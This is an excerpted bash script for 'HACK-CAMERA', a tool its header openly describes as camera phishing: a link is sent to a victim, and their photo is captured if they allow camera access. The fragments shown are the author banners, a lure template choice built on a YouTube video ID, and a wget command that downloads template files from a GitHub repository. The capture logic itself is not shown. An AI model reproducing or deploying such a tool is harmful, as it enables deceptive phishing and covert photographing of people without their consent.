...
# HACK-CAMERA 
# Version    : 2.1
# Description: CameraHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : SAHIL SHAH GILLANI
# Github     : https://github.com/ProudPakistanie
# Join Me    : https://facebook.com/ProudPakistanie
# Date       : 25-05-2023
...
${blue}\___ \ / _` | '_ \| | |
${blue}___) | (_| | | | | | |
${blue}|____/ \__,_|_| |_|_|_|
                       
${green}                                               [By Sahil Shah Gillani]
"
...
# Select template
    if echo $option | grep -q "1"; then
        ...
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nProud${nc}@${blue}Pakistanie ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
...
$red[Author]     ${cyan} :[SS GILLANI]
$red[Github]     ${cyan} :[https://github.com/ProudPakistanie] 
$red[Join us]    ${cyan} :[https://facebook.com/ProudPakistanie]
$red[Twitter   ${cyan} :[Peace4Changes]"
printf "${cyan}\nSS${nc}@${cyan}GILLANI ${red}$ ${nc}"
read about
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/ProudPakistanie/files/raw/main/${dir}.zip"
